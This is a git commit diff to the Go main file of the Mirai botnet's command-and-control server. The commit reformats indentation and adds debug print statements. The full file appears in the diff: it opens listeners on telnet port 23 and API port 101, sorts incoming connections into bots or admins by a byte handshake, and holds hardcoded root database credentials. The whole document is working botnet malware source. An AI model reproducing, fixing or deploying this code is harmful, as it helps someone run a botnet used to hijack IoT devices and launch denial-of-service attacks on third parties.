be792913805293e987e3a15d129f815c5afcfc15
gx1 <18548727+giper45@users.noreply.github.com>
2024-11-19 11:10:39 +0100

    debug: troubleshooting debug on mirai cnc

--- mirai/cnc/main.go
+++ mirai/cnc/main.go
@@ -1,113 +1,119 @@
 package main
 
 import (
-    "fmt"
-    "net"
-    "errors"
-    "time"
+	"errors"
+	"fmt"
+	"net"
+	"time"
 )
 
-const DatabaseAddr string   = "127.0.0.1:3306"
-const DatabaseUser string   = "root"
-const DatabasePass string   = "root"
-const DatabaseTable string  = "mirai"
+const DatabaseAddr string = "127.0.0.1:3306"
+const DatabaseUser string = "root"
+const DatabasePass string = "root"
+const DatabaseTable string = "mirai"
 
 var clientList *ClientList = NewClientList()
 var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)
 
 func main() {
-    tel, err := net.Listen("tcp", "0.0.0.0:23")
-    if err != nil {
-        fmt.Println(err)
-        return
-    }
+	fmt.Println("[CNC] Start")
+	tel, err := net.Listen("tcp", "0.0.0.0:23")
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
 
-    api, err := net.Listen("tcp", "0.0.0.0:101")
-    if err != nil {
-        fmt.Println(err)
-        return
-    }
+	api, err := net.Listen("tcp", "0.0.0.0:101")
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
 
-    go func() {
-        for {
-            conn, err := api.Accept()
-            if err != nil {
-                break
-            }
-            go apiHandler(conn)
-        }
-    }()
+	fmt.Println("[+] Port listening completed")
 
-    for {
-        conn, err := tel.Accept()
-        if err != nil {
-            break
-        }
-        go initialHandler(conn)
-    }
+	go func() {
+		for {
+			conn, err := api.Accept()
+			if err != nil {
+				break
+			}
+			go apiHandler(conn)
+		}
+	}()
 
-    fmt.Println("Stopped accepting clients")
+	for {
+		conn, err := tel.Accept()
+		if err != nil {
+			break
+		}
+		go initialHandler(conn)
+	}
+
+	fmt.Println("Stopped accepting clients")
 }
 
 func initialHandler(conn net.Conn) {
-    defer conn.Close()
+	defer conn.Close()
 
-    conn.SetDeadline(time.Now().Add(10 * time.Second))
+	conn.SetDeadline(time.Now().Add(10 * time.Second))
 
-    buf := make([]byte, 32)
-    l, err := conn.Read(buf)
-    if err != nil || l <= 0 {
-        return
-    }
+	buf := make([]byte, 32)
+	l, err := conn.Read(buf)
+	if err != nil || l <= 0 {
+		return
+	}
 
-    if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
-        if buf[3] > 0 {
-            string_len := make([]byte, 1)
-            l, err := conn.Read(string_len)
-            if err != nil || l <= 0 {
-                return
-            }
-            var source string
-            if string_len[0] > 0 {
-                source_buf := make([]byte, string_len[0])
-                l, err := conn.Read(source_buf)
-                if err != nil || l <= 0 {
-                    return
-                }
-                source = string(source_buf)
-            }
-            NewBot(conn, buf[3], source).Handle()
-        } else {
-            NewBot(conn, buf[3], "").Handle()
-        }
-    } else {
-        NewAdmin(conn).Handle()
-    }
+	if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
+		if buf[3] > 0 {
+			string_len := make([]byte, 1)
+			l, err := conn.Read(string_len)
+			if err != nil || l <= 0 {
+				return
+			}
+			var source string
+			if string_len[0] > 0 {
+				source_buf := make([]byte, string_len[0])
+				l, err := conn.Read(source_buf)
+				if err != nil || l <= 0 {
+					return
+				}
+				source = string(source_buf)
+			}
+			fmt.Println("NEW ADMIN WITH SOURCE")
+			NewBot(conn, buf[3], source).Handle()
+		} else {
+			fmt.Println("NEW ADMIN NO SOURCE")
+			NewBot(conn, buf[3], "").Handle()
+		}
+	} else {
+		fmt.Println("NEW ADMIN")
+		NewAdmin(conn).Handle()
+	}
 }
 
 func apiHandler(conn net.Conn) {
-    defer conn.Close()
+	defer conn.Close()
 
-    NewApi(conn).Handle()
+	NewApi(conn).Handle()
 }
 
-func readXBytes(conn net.Conn, buf []byte) (error) {
-    tl := 0
+func readXBytes(conn net.Conn, buf []byte) error {
+	tl := 0
 
-    for tl < len(buf) {
-        n, err := conn.Read(buf[tl:])
-        if err != nil {
-            return err
-        }
-        if n <= 0 {
-            return errors.New("Connection closed unexpectedly")
-        }
-        tl += n
-    }
+	for tl < len(buf) {
+		n, err := conn.Read(buf[tl:])
+		if err != nil {
+			return err
+		}
+		if n <= 0 {
+			return errors.New("Connection closed unexpectedly")
+		}
+		tl += n
+	}
 
-    return nil
+	return nil
 }
 
 func netshift(prefix uint32, netmask uint8) uint32 {
-    return uint32(prefix >> (32 - netmask))
+	return uint32(prefix >> (32 - netmask))
 }
